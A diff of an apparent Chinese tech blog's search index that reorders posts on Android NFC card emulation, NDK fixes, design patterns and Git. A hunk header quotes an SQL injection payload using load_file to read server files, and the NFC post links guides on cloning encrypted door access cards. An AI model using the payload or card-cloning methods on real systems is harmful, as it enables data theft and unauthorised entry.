href="http://www.miui.com/thread-8282972-1-1.html" target="_blank" rel="noopener">小米开发版获取完整root教程</a><br><a href="https://blog.csdn.net/xCnhYKoHj3eK/article/details/79016306" target="_blank" rel="noopener">【解锁教程&amp;ROOT教程】支持全系华为</a><br><a href="https://jingyan.baidu.com/article/363872ec7246e36e4ba16f24.html" target="_blank" rel="noopener">怎么强制解华为锁bl锁</a><br><a href="https://www.52pojie.cn/thread-780859-1-1.html" target="_blank" rel="noopener">求这个型号的华为手机强制解除BL锁有效方法</a><br><a href="http://downloadandroidrom.com/" target="_blank" rel="noopener">Browse files by Device</a><br><a href="https://developers.google.com/android/drivers" target="_blank" rel="noopener">Driver Binaries for Nexus and Pixel Devices</a><br><a href="https://www.xda-developers.com/" target="_blank" rel="noopener">xda-developers</a>  </p>
-]]></content>
-      <categories>
-        <category>android</category>
-      </categories>
-      <tags>
-        <tag>android</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>android自定义View处理padding和wrap_content和自定义属性</title>
     <url>/post/1728291640.html</url>
     <content><![CDATA[<h2 id="android-View-处理padding"><a href="#android-View-处理padding" class="headerlink" title="android View 处理padding"></a>android View 处理padding</h2><pre><code>@Override
@@ -4941,6 +4898,49 @@ protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec) {
     }
 }
 </code></pre>]]></content>
+      <categories>
+        <category>android</category>
+      </categories>
+      <tags>
+        <tag>android</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>android nfc模拟卡</title>
+    <url>/post/2987589929.html</url>
+    <content><![CDATA[<p><a href="http://bbs.xiaomi.cn/t-30553502-1-o1" target="_blank" rel="noopener">搞定加密卡！小米门禁卡模拟那些事</a>  </p>
+<h2 id="手机信息"><a href="#手机信息" class="headerlink" title="手机信息"></a>手机信息</h2><pre><code>手机：小米5s
+版本：MIUI10 8.11.1 开发版
+</code></pre><h2 id="0x00-解锁-amp-amp-刷机"><a href="#0x00-解锁-amp-amp-刷机" class="headerlink" title="0x00 解锁&amp;&amp;刷机"></a>0x00 解锁&amp;&amp;刷机</h2><p><strong>解锁</strong>  </p>
+<p>首先登录小米官网获取解锁工具<br><a href="https://unlock.update.miui.com" target="_blank" rel="noopener">解锁工具下载</a><br><a href="http://www.miui.com/thread-3367802-1-1.html" target="_blank" rel="noopener">小米手机解锁 Bootloader 教程以及常见问题</a>  </p>
+<p>官网给的解决方案： </p>
+<pre><code>请按照以下流程进行操作：
+1.进入“设置 -&gt; 开发者选项 -&gt; 设备解锁状态”中绑定账号和设备；
+2.手动进入Bootloader模式（关机后，同时按住开机键和音量下键）；
+3.通过USB连接手机，点击 “解锁”按钮；
+</code></pre><p>解锁的时候要检查解锁账号，要3天验证在这个手机登录  </p>
+<p>1.小米手机设置<br>设置-小米账号-登录小米账号<br>关机<br>进入Bootloader模式(同时按住开机键和音量下键)<br>会出现一个安卓小机器人下面FASTBOOT文字<br>usb连接电脑  </p>
+<p>2.电脑端<br>打开下载的手机解锁工具<br>点击解锁<br>然后弹出确认解锁<br>等待解锁  </p>
+<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/25/01.png" alt=""></p>
+<pre><code>设置 -&gt; 更多设置 -&gt; 开发者选项 -&gt; 设备解锁状态 -&gt; 绑定账号和设备  
+关机 -&gt; 同时按住开机键和音量下键 -&gt; 打开下载的工具 -&gt; 手机连接 -&gt; 解锁 
+
+
+开发者选项:
+我的设备 - 全部参数 - MIUI版本 多次按 进入开发者模式  
+</code></pre><p><strong>刷机</strong>  </p>
+<p><a href="http://www.miui.com/shuaji-393.html" target="_blank" rel="noopener">通用线刷教程</a>  </p>
+<p>参考了上面的文章  </p>
+<p>步骤：<br>下载通用解锁工具<br>下载线刷包下载开发版的(开发版自带root)<br>手机关机状态下，同时按住 音量下+电源键 进入Fastboot模式将手机USB连接电脑。<br>usb连接电脑<br>解压线刷包<br>打开通用解锁工具<br>选择解压目录<br>点击加载设备<br>刷机<br>等待成功  </p>
+<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/25/02.png" alt=""></p>
+<h2 id="0x01-nfc软件"><a href="#0x01-nfc软件" class="headerlink" title="0x01 nfc软件"></a>0x01 nfc软件</h2><p>在酷安找到了一些app<br><a href="https://www.coolapk.com/search?q=nfc" target="_blank" rel="noopener">nfc list</a><br>然后测试了一下NFC卡模拟  </p>
+<p>然后给NFC卡模拟 root权限 和 nfc权限  </p>
+<p>安全中心-应用管理-权限-ROOT权限管理 给 NFC卡模拟  </p>
+<p><strong>然后测试软件</strong><br>卡读取成功了<br>然后测试门禁不好使  </p>
+<hr>
+<p>后文再续</p>
+<p><a href="http://www.miui.com/thread-5869303-1-1.html" target="_blank" rel="noopener">【教程】让你的手机模拟门禁卡 拿着手机进小区 加密也模拟</a><br><a href="http://tieba.baidu.com/p/5759500931" target="_blank" rel="noopener">成功复制加密门禁卡！！！</a><br><a href="https://club.huawei.com/thread-12231900-1-1.html" target="_blank" rel="noopener">【原创】浅谈NFC手机模拟门禁卡、饭卡（非ROOT）-精华帖</a><br><a href="https://www.coolapk.com/apk/com.yuanwofei.cardemulator" target="_blank" rel="noopener">NFC卡模拟</a><br><a href="https://www.freebuf.com/geek/80368.html" target="_blank" rel="noopener">如何利用Nexus 5伪造一张门禁卡</a><br><a href="http://www.jinciwei.cn/f268134.html" target="_blank" rel="noopener">搞定加密卡！小米门禁卡模拟那些事</a><br><a href="https://club.huawei.com/thread-14272732-1-1.html" target="_blank" rel="noopener">Root神器–超级授权SuperSU_v2.82-SR5专业破解最新版！</a><br><a href="https://club.huawei.com/forum.php?mod=viewthread&amp;tid=12832132" target="_blank" rel="noopener">【HRT_梦里无念】荣耀6X TWRP3.1 EMUI5.0专用 支持Data解密</a><br><a href="http://www.miui.com/shuaji-393.html" target="_blank" rel="noopener">小米线刷</a><br><a href="https://jingyan.baidu.com/article/a3a3f8112501e38da3eb8a65.html" target="_blank" rel="noopener">小米手机MIUI9开发版开启ROOT权限方法</a><br><a href="http://www.miui.com/thread-8282972-1-1.html" target="_blank" rel="noopener">小米开发版获取完整root教程</a><br><a href="https://blog.csdn.net/xCnhYKoHj3eK/article/details/79016306" target="_blank" rel="noopener">【解锁教程&amp;ROOT教程】支持全系华为</a><br><a href="https://jingyan.baidu.com/article/363872ec7246e36e4ba16f24.html" target="_blank" rel="noopener">怎么强制解华为锁bl锁</a><br><a href="https://www.52pojie.cn/thread-780859-1-1.html" target="_blank" rel="noopener">求这个型号的华为手机强制解除BL锁有效方法</a><br><a href="http://downloadandroidrom.com/" target="_blank" rel="noopener">Browse files by Device</a><br><a href="https://developers.google.com/android/drivers" target="_blank" rel="noopener">Driver Binaries for Nexus and Pixel Devices</a><br><a href="https://www.xda-developers.com/" target="_blank" rel="noopener">xda-developers</a>  </p>
+]]></content>
       <categories>
         <category>android</category>
       </categories>
@@ -5568,6 +5568,32 @@ failed on &#39;/sdcard/busybox&#39; - Cross-device link
       </tags>
   </entry>
   <entry>
+    <title>android_No toolchains found in the NDK toolchains folder for ABI with prefix: mips64el-linux-android</title>
+    <url>/post/3707592036.html</url>
+    <content><![CDATA[<p>主要是缺少这个文件 mips64el-linux-android<br>同理一些相同NDK目录可能也是缺少某些文件  </p>
+<pre><code>ndk目录
+/Users/shaomiao/Library/Android/sdk/ndk-bundle
+</code></pre><p>1.打开项目local.properties文件</p>
+<pre><code>Project/local.properties
+
+ndk.dir
+</code></pre><p>2.打开ndk.dir文件夹</p>
+<p>3.下载对应的ndk  </p>
+<p><a href="https://developer.android.com/ndk/downloads/?hl=zh-cn" target="_blank" rel="noopener">ndk下载</a>  </p>
+<p>4.打开toolchains文件夹  </p>
+<p>5.从下载的ndk目录中toolchains/mips64el-linux-android-4.9 复制到 项目ndk-bundle/toolchains目录里</p>
+<p>6.make project</p>
+<pre><code>build/Make Project
+</code></pre><h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a href="https://blog.csdn.net/qq_24118527/article/details/82867864" target="_blank" rel="noopener">完美解决 No toolchains found in the NDK toolchains folder for ABI with prefix: mips64el-linux-android</a>  </p>
+]]></content>
+      <categories>
+        <category>android</category>
+      </categories>
+      <tags>
+        <tag>android</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>android里layout.xml的include</title>
     <url>/post/2155240333.html</url>
     <content><![CDATA[<pre><code>include 两个一样的layout
@@ -5649,32 +5675,6 @@ item2_tv4.setText(&quot;64-23&quot;);
 item2_tv5.setText(&quot;进球-失球&quot;);
 item2_tv6.setText(&quot;1连胜中&quot;);
 </code></pre>]]></content>
-      <categories>
-        <category>android</category>
-      </categories>
-      <tags>
-        <tag>android</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>android_No toolchains found in the NDK toolchains folder for ABI with prefix: mips64el-linux-android</title>
-    <url>/post/3707592036.html</url>
-    <content><![CDATA[<p>主要是缺少这个文件 mips64el-linux-android<br>同理一些相同NDK目录可能也是缺少某些文件  </p>
-<pre><code>ndk目录
-/Users/shaomiao/Library/Android/sdk/ndk-bundle
-</code></pre><p>1.打开项目local.properties文件</p>
-<pre><code>Project/local.properties
-
-ndk.dir
-</code></pre><p>2.打开ndk.dir文件夹</p>
-<p>3.下载对应的ndk  </p>
-<p><a href="https://developer.android.com/ndk/downloads/?hl=zh-cn" target="_blank" rel="noopener">ndk下载</a>  </p>
-<p>4.打开toolchains文件夹  </p>
-<p>5.从下载的ndk目录中toolchains/mips64el-linux-android-4.9 复制到 项目ndk-bundle/toolchains目录里</p>
-<p>6.make project</p>
-<pre><code>build/Make Project
-</code></pre><h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a href="https://blog.csdn.net/qq_24118527/article/details/82867864" target="_blank" rel="noopener">完美解决 No toolchains found in the NDK toolchains folder for ABI with prefix: mips64el-linux-android</a>  </p>
-]]></content>
       <categories>
         <category>android</category>
       </categories>
@@ -7517,8 +7517,8 @@ http://127.0.0.1/Less-1/?id=&#39; union select 1,2,(select load_file(&#39;/var/w
         <category>web安全</category>
       </categories>
       <tags>
-        <tag>web安全</tag>
         <tag>sql注入</tag>
+        <tag>web安全</tag>
       </tags>
   </entry>
   <entry>
@@ -8897,156 +8897,6 @@ $ adb shell pm list packages // 列出所有已安装的包
       </tags>
   </entry>
   <entry>
-    <title>设计模式-策略模式（strategy）</title>
-    <url>/post/2113223531.html</url>
-    <content><![CDATA[<h2 id="策略模式"><a href="#策略模式" class="headerlink" title="策略模式"></a>策略模式</h2><p>视频地址<br><a href="http://www.imooc.com/video/3213" target="_blank" rel="noopener">http://www.imooc.com/video/3213</a></p>
-<p>策略模式  ：  </p>
-<p>将可变的部分  从程序中抽象分离成算法接口在该接口下分别封装一系列的算法实现<br>并使他们可以相互等候，从而导致客户端程序独立于算法的改变。  </p>
-<p>不变更代码架构<br>通过开发与重构<br>拥抱需求的变化<br>使用策略模式  </p>
-<p>虚拟应用：  鸭子应用<br>飞行的能力<br>更多鸭子类型<br>每六个月发布一款产品  </p>
-<p>原有功能  </p>
-<p>鸭子的鸣叫功能<br>鸭子的显示功能  </p>
-<p>需求：<br>加入飞行能力  </p>
-<p>原有项目：<br>鸭子基类<br>Duck.class</p>
-<pre><code>/*
- * 超类，所有的鸭子都要继承此类
- * 抽象了鸭子的行为：显示和鸣叫
- */
-public abstract class Duck {
-
-    /*
-     * 鸭子发出叫声
-     * 通用行为，由超类实现
-     */
-    public void quack(){
-        System.out.println(&quot;嘎嘎嘎&quot;);
-    }
-
-    /*
-     * 显示鸭子的外观
-     * 鸭子的外观各不相同，声明为abstract， 由子类实现
-     */
-    public abstract void display();
-
-
-}
-</code></pre><p>需求:让鸭子飞起来？  </p>
-<p>方案一：继承<br>    在父类中提供实现方法，子类通过继承获得父类中的飞行行为  </p>
-<pre><code>Duck.class
-
-public void fly(){
-    System.out.println(&quot;用翅膀飞行&quot;);
-}
-</code></pre><p>优点<br>  简单易用(粗暴丑陋)，已用应用可以快速添加飞行的能力<br>缺点<br>  不具有灵活性，对未来变更支持差<br>  需要通过在子类中覆写飞行的方法以提供新的飞行行为。这很容易造成错误(粗心的程序员忘记覆写)。  </p>
-<p>———————————–pass———————————-  </p>
-<p>方案二：抽象方法<br>  在父类中提供抽象方法，强迫子类实现自己的飞行行为  </p>
-<pre><code>public abstract void fly();
-</code></pre><p>优点<br>  足够灵活。  </p>
-<p>缺点<br>  累死<br>  每个子类都要实现一遍代码，即使是相同的行为也不例外。<br>  代码重复，没有复用代码。  </p>
-<p>————————-pass————————————-  </p>
-<p>######继承是重用代码的利器  </p>
-<p>######但继承并不总是最好的工具  </p>
-<hr>
-<p>#####复合优先于继承</p>
-<p>#####多用组合，少用继承</p>
-<p>组合<br>has-a     </p>
-<p>#use  </p>
-<p>组合：<br> 在类中增加一个私有域，引用另一个已有的类的实例，通过调用引用实例的方法从而获得新的功能，这种设计称作组合(复合)  </p>
-<p>方案三：组合<br>  将飞行行为抽象为接口，在父类中持有该接口，并由该接口代理飞行行为。  </p>
-<pre><code>/*
- * 策略接口，实现鸭子的飞行行为
- */
-public interface FlyingStragety {
-
-    void performFly();
-}
-
-private FlyingStragety flyingStragety;
-
-
-public void setFlyingStragety(FlyingStragety flyingStragety) {
-    this.flyingStragety = flyingStragety;
-}
-
-public void fly(){
-    flyingStragety.performFly();
-}
-</code></pre><p>优点：<br>  足够灵活<br>  复用代码，更易于维护  </p>
-<p>缺点：  </p>
-<p>策略模式中的设计原则：<br>  找出应用中需要变化的部分，把他们独立出来，不要和那些不需要变化的代码混在一起。<br>  面向接口编程，而不是面向实现编程。<br>  多用组合，少用继承。  </p>
-<p>策略模式的实现：<br>  （1） 通过分离变化得出的策略接口Strategy<br>  （2） Strategy的实现类<br>  （3） 客户程序”有一个”Stategy<br>  （4） 客户程序中选择/组装正确的Strategy实现  </p>
-]]></content>
-      <categories>
-        <category>设计模式</category>
-      </categories>
-      <tags>
-        <tag>设计模式</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Git命令行基础</title>
-    <url>/post/744454998.html</url>
-    <content><![CDATA[<h2 id="Git命令行基础"><a href="#Git命令行基础" class="headerlink" title="Git命令行基础"></a>Git命令行基础</h2><p>Git是一个开源的分布式版本控制工具  </p>
-<h2 id="配置身份"><a href="#配置身份" class="headerlink" title="配置身份"></a>配置身份</h2><p><img src="http://upload-images.jianshu.io/upload_images/2590671-227984aa4a843aea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="配置身份"></p>
-<pre><code>git config --global user.name &quot;Tony&quot;
-git config --global user.email &quot;tony@gmail.com&quot;
-</code></pre><h2 id="检查是否配置成功"><a href="#检查是否配置成功" class="headerlink" title="检查是否配置成功"></a>检查是否配置成功</h2><p><img src="http://upload-images.jianshu.io/upload_images/2590671-928c9c6757dc67e0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="检查配置"></p>
-<pre><code>git config --global user.name 
-git config --global user.email
-</code></pre><h2 id="创建本地代码仓库"><a href="#创建本地代码仓库" class="headerlink" title="创建本地代码仓库"></a>创建本地代码仓库</h2><p><img src="http://upload-images.jianshu.io/upload_images/2590671-e754601d1294c2da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="创建本地仓库"></p>
-<pre><code>git init
-</code></pre><p>仓库创建完成后会在项目目录下生成一个隐藏的.git文件夹 这个文件夹就是用来记录本地所有的Git操作的<br>如果你想要删除本地仓库 只需要删除这个文件夹就行  </p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-3dff03268e6c368d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git"></p>
-<h2 id="提交本地代码"><a href="#提交本地代码" class="headerlink" title="提交本地代码"></a>提交本地代码</h2><pre><code>git add [提交的文件名] // 提交一个文件 
-
-git add . // 提交所有文件
-</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-7e2ae3e2d7d6b0ce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git add"></p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-5a267cd07270af2f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git add ."></p>
-<p>现在所有文件都加好了  然后用commit命令提交下  </p>
-<pre><code>git commit -m &quot;First commit.&quot;
-</code></pre><h2 id="忽略文件"><a href="#忽略文件" class="headerlink" title="忽略文件"></a>忽略文件</h2><p>在项目中创建  .gitignore 文件  </p>
-<p>在.gitignore文件下 每行指定的文件或目录会排除在版本控制外</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-1fb5b8fd5616d1da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=".gitignore"></p>
-<h2 id="查看修改内容"><a href="#查看修改内容" class="headerlink" title="查看修改内容"></a>查看修改内容</h2><pre><code>git status
-</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-2ce1bd904ae1ed59.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git status"></p>
-<h2 id="查看更改内容"><a href="#查看更改内容" class="headerlink" title="查看更改内容"></a>查看更改内容</h2><pre><code>git diff
-</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-fbf6e8ddf3bd958b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git diff"></p>
-<h2 id="撤销未提交的修改"><a href="#撤销未提交的修改" class="headerlink" title="撤销未提交的修改"></a>撤销未提交的修改</h2><pre><code>git checkout
-</code></pre><h2 id="撤回提交"><a href="#撤回提交" class="headerlink" title="撤回提交"></a>撤回提交</h2><pre><code>git reset
-</code></pre><h2 id="查看提交记录"><a href="#查看提交记录" class="headerlink" title="查看提交记录"></a>查看提交记录</h2><pre><code>git log
-</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-3446be699c5f2adb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git log"></p>
-<p>查看修改一行  </p>
-<pre><code>git log 31f8f5c098c2b1988deea9a99a4511e35f85f0b6 -1
-</code></pre><p>查看具体修改内容  </p>
-<pre><code>git log 31f8f5c098c2b1988deea9a99a4511e35f85f0b6 -1 -p
-</code></pre><p>##查看分支  </p>
-<pre><code>git branch    
-</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-2778e9e774286b00.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git branch"></p>
-<h2 id="建立分支"><a href="#建立分支" class="headerlink" title="建立分支"></a>建立分支</h2><pre><code>git branch version1.0
-</code></pre><h2 id="切换分支"><a href="#切换分支" class="headerlink" title="切换分支"></a>切换分支</h2><pre><code>git checkout version1.0
-</code></pre><h2 id="合并分支"><a href="#合并分支" class="headerlink" title="合并分支"></a>合并分支</h2><pre><code>git checkout master
-git merge version1.0
-</code></pre><h2 id="删除分支"><a href="#删除分支" class="headerlink" title="删除分支"></a>删除分支</h2><pre><code>git branch -D version1.0
-</code></pre><h2 id="与远程版本库协作"><a href="#与远程版本库协作" class="headerlink" title="与远程版本库协作"></a>与远程版本库协作</h2><pre><code>git clone https://github.com/example/text.git
-</code></pre><h2 id="本地修改内容同步到远程版本库"><a href="#本地修改内容同步到远程版本库" class="headerlink" title="本地修改内容同步到远程版本库"></a>本地修改内容同步到远程版本库</h2><pre><code>git push origin master
-</code></pre><h2 id="远程版本库修改同步到本地"><a href="#远程版本库修改同步到本地" class="headerlink" title="远程版本库修改同步到本地"></a>远程版本库修改同步到本地</h2><pre><code>git fetch origin master
-</code></pre><h2 id="查看远程版本库修改了那些东西"><a href="#查看远程版本库修改了那些东西" class="headerlink" title="查看远程版本库修改了那些东西"></a>查看远程版本库修改了那些东西</h2><pre><code>git diff origin/master
-</code></pre><p>之后在调用merge命令将origin/master分支上的修改合并到主分支上  </p>
-<pre><code>git merge origin/master
-</code></pre><p>pull命令是相当于 fetch和merge两个命令放在一起执行  </p>
-<pre><code>git pull origon master
-</code></pre><hr>
-<h2 id="查看已存放：（这个最有用）"><a href="#查看已存放：（这个最有用）" class="headerlink" title="查看已存放：（这个最有用）"></a>查看已存放：（这个最有用）</h2><pre><code>git ls-files
-</code></pre><h2 id="查看还没添加的文件："><a href="#查看还没添加的文件：" class="headerlink" title="查看还没添加的文件："></a>查看还没添加的文件：</h2><pre><code>git status
-</code></pre>]]></content>
-      <categories>
-        <category>git</category>
-      </categories>
-      <tags>
-        <tag>git</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>fragment懒加载</title>
     <url>/post/2289611691.html</url>
     <content><![CDATA[<h2 id="Fragment懒加载"><a href="#Fragment懒加载" class="headerlink" title="Fragment懒加载"></a>Fragment懒加载</h2><p>用于viewpager+fragment布局  </p>
@@ -9449,6 +9299,156 @@ public class BaseFragment extends Fragment {
       </tags>
   </entry>
   <entry>
+    <title>设计模式-策略模式（strategy）</title>
+    <url>/post/2113223531.html</url>
+    <content><![CDATA[<h2 id="策略模式"><a href="#策略模式" class="headerlink" title="策略模式"></a>策略模式</h2><p>视频地址<br><a href="http://www.imooc.com/video/3213" target="_blank" rel="noopener">http://www.imooc.com/video/3213</a></p>
+<p>策略模式  ：  </p>
+<p>将可变的部分  从程序中抽象分离成算法接口在该接口下分别封装一系列的算法实现<br>并使他们可以相互等候，从而导致客户端程序独立于算法的改变。  </p>
+<p>不变更代码架构<br>通过开发与重构<br>拥抱需求的变化<br>使用策略模式  </p>
+<p>虚拟应用：  鸭子应用<br>飞行的能力<br>更多鸭子类型<br>每六个月发布一款产品  </p>
+<p>原有功能  </p>
+<p>鸭子的鸣叫功能<br>鸭子的显示功能  </p>
+<p>需求：<br>加入飞行能力  </p>
+<p>原有项目：<br>鸭子基类<br>Duck.class</p>
+<pre><code>/*
+ * 超类，所有的鸭子都要继承此类
+ * 抽象了鸭子的行为：显示和鸣叫
+ */
+public abstract class Duck {
+
+    /*
+     * 鸭子发出叫声
+     * 通用行为，由超类实现
+     */
+    public void quack(){
+        System.out.println(&quot;嘎嘎嘎&quot;);
+    }
+
+    /*
+     * 显示鸭子的外观
+     * 鸭子的外观各不相同，声明为abstract， 由子类实现
+     */
+    public abstract void display();
+
+
+}
+</code></pre><p>需求:让鸭子飞起来？  </p>
+<p>方案一：继承<br>    在父类中提供实现方法，子类通过继承获得父类中的飞行行为  </p>
+<pre><code>Duck.class
+
+public void fly(){
+    System.out.println(&quot;用翅膀飞行&quot;);
+}
+</code></pre><p>优点<br>  简单易用(粗暴丑陋)，已用应用可以快速添加飞行的能力<br>缺点<br>  不具有灵活性，对未来变更支持差<br>  需要通过在子类中覆写飞行的方法以提供新的飞行行为。这很容易造成错误(粗心的程序员忘记覆写)。  </p>
+<p>———————————–pass———————————-  </p>
+<p>方案二：抽象方法<br>  在父类中提供抽象方法，强迫子类实现自己的飞行行为  </p>
+<pre><code>public abstract void fly();
+</code></pre><p>优点<br>  足够灵活。  </p>
+<p>缺点<br>  累死<br>  每个子类都要实现一遍代码，即使是相同的行为也不例外。<br>  代码重复，没有复用代码。  </p>
+<p>————————-pass————————————-  </p>
+<p>######继承是重用代码的利器  </p>
+<p>######但继承并不总是最好的工具  </p>
+<hr>
+<p>#####复合优先于继承</p>
+<p>#####多用组合，少用继承</p>
+<p>组合<br>has-a     </p>
+<p>#use  </p>
+<p>组合：<br> 在类中增加一个私有域，引用另一个已有的类的实例，通过调用引用实例的方法从而获得新的功能，这种设计称作组合(复合)  </p>
+<p>方案三：组合<br>  将飞行行为抽象为接口，在父类中持有该接口，并由该接口代理飞行行为。  </p>
+<pre><code>/*
+ * 策略接口，实现鸭子的飞行行为
+ */
+public interface FlyingStragety {
+
+    void performFly();
+}
+
+private FlyingStragety flyingStragety;
+
+
+public void setFlyingStragety(FlyingStragety flyingStragety) {
+    this.flyingStragety = flyingStragety;
+}
+
+public void fly(){
+    flyingStragety.performFly();
+}
+</code></pre><p>优点：<br>  足够灵活<br>  复用代码，更易于维护  </p>
+<p>缺点：  </p>
+<p>策略模式中的设计原则：<br>  找出应用中需要变化的部分，把他们独立出来，不要和那些不需要变化的代码混在一起。<br>  面向接口编程，而不是面向实现编程。<br>  多用组合，少用继承。  </p>
+<p>策略模式的实现：<br>  （1） 通过分离变化得出的策略接口Strategy<br>  （2） Strategy的实现类<br>  （3） 客户程序”有一个”Stategy<br>  （4） 客户程序中选择/组装正确的Strategy实现  </p>
+]]></content>
+      <categories>
+        <category>设计模式</category>
+      </categories>
+      <tags>
+        <tag>设计模式</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Git命令行基础</title>
+    <url>/post/744454998.html</url>
+    <content><![CDATA[<h2 id="Git命令行基础"><a href="#Git命令行基础" class="headerlink" title="Git命令行基础"></a>Git命令行基础</h2><p>Git是一个开源的分布式版本控制工具  </p>
+<h2 id="配置身份"><a href="#配置身份" class="headerlink" title="配置身份"></a>配置身份</h2><p><img src="http://upload-images.jianshu.io/upload_images/2590671-227984aa4a843aea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="配置身份"></p>
+<pre><code>git config --global user.name &quot;Tony&quot;
+git config --global user.email &quot;tony@gmail.com&quot;
+</code></pre><h2 id="检查是否配置成功"><a href="#检查是否配置成功" class="headerlink" title="检查是否配置成功"></a>检查是否配置成功</h2><p><img src="http://upload-images.jianshu.io/upload_images/2590671-928c9c6757dc67e0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="检查配置"></p>
+<pre><code>git config --global user.name 
+git config --global user.email
+</code></pre><h2 id="创建本地代码仓库"><a href="#创建本地代码仓库" class="headerlink" title="创建本地代码仓库"></a>创建本地代码仓库</h2><p><img src="http://upload-images.jianshu.io/upload_images/2590671-e754601d1294c2da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="创建本地仓库"></p>
+<pre><code>git init
+</code></pre><p>仓库创建完成后会在项目目录下生成一个隐藏的.git文件夹 这个文件夹就是用来记录本地所有的Git操作的<br>如果你想要删除本地仓库 只需要删除这个文件夹就行  </p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-3dff03268e6c368d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git"></p>
+<h2 id="提交本地代码"><a href="#提交本地代码" class="headerlink" title="提交本地代码"></a>提交本地代码</h2><pre><code>git add [提交的文件名] // 提交一个文件 
+
+git add . // 提交所有文件
+</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-7e2ae3e2d7d6b0ce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git add"></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-5a267cd07270af2f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git add ."></p>
+<p>现在所有文件都加好了  然后用commit命令提交下  </p>
+<pre><code>git commit -m &quot;First commit.&quot;
+</code></pre><h2 id="忽略文件"><a href="#忽略文件" class="headerlink" title="忽略文件"></a>忽略文件</h2><p>在项目中创建  .gitignore 文件  </p>
+<p>在.gitignore文件下 每行指定的文件或目录会排除在版本控制外</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-1fb5b8fd5616d1da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=".gitignore"></p>
+<h2 id="查看修改内容"><a href="#查看修改内容" class="headerlink" title="查看修改内容"></a>查看修改内容</h2><pre><code>git status
+</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-2ce1bd904ae1ed59.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git status"></p>
+<h2 id="查看更改内容"><a href="#查看更改内容" class="headerlink" title="查看更改内容"></a>查看更改内容</h2><pre><code>git diff
+</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-fbf6e8ddf3bd958b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git diff"></p>
+<h2 id="撤销未提交的修改"><a href="#撤销未提交的修改" class="headerlink" title="撤销未提交的修改"></a>撤销未提交的修改</h2><pre><code>git checkout
+</code></pre><h2 id="撤回提交"><a href="#撤回提交" class="headerlink" title="撤回提交"></a>撤回提交</h2><pre><code>git reset
+</code></pre><h2 id="查看提交记录"><a href="#查看提交记录" class="headerlink" title="查看提交记录"></a>查看提交记录</h2><pre><code>git log
+</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-3446be699c5f2adb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git log"></p>
+<p>查看修改一行  </p>
+<pre><code>git log 31f8f5c098c2b1988deea9a99a4511e35f85f0b6 -1
+</code></pre><p>查看具体修改内容  </p>
+<pre><code>git log 31f8f5c098c2b1988deea9a99a4511e35f85f0b6 -1 -p
+</code></pre><p>##查看分支  </p>
+<pre><code>git branch    
+</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-2778e9e774286b00.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git branch"></p>
+<h2 id="建立分支"><a href="#建立分支" class="headerlink" title="建立分支"></a>建立分支</h2><pre><code>git branch version1.0
+</code></pre><h2 id="切换分支"><a href="#切换分支" class="headerlink" title="切换分支"></a>切换分支</h2><pre><code>git checkout version1.0
+</code></pre><h2 id="合并分支"><a href="#合并分支" class="headerlink" title="合并分支"></a>合并分支</h2><pre><code>git checkout master
+git merge version1.0
+</code></pre><h2 id="删除分支"><a href="#删除分支" class="headerlink" title="删除分支"></a>删除分支</h2><pre><code>git branch -D version1.0
+</code></pre><h2 id="与远程版本库协作"><a href="#与远程版本库协作" class="headerlink" title="与远程版本库协作"></a>与远程版本库协作</h2><pre><code>git clone https://github.com/example/text.git
